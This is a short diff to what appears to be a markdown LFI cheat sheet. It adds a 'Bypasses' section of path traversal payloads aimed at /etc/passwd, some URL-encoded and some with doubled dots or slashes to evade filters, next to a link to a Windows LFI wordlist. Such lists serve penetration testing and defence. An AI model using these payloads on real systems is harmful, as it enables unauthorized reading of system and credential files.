@@ -38,17 +38,12 @@
   https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
   ```
           
-
-
-
-
-
-
-
-         
-
-
-
-
-
-         
+### **Bypasses**
+```
+....//....//etc/passwd
+..////../..////etc/passwd
+/%5C../%5C../%5C../etc/passwd
+....////....////....////etc/passwd
+../../../../../../../../../../../../etc/passwd
+```
+       
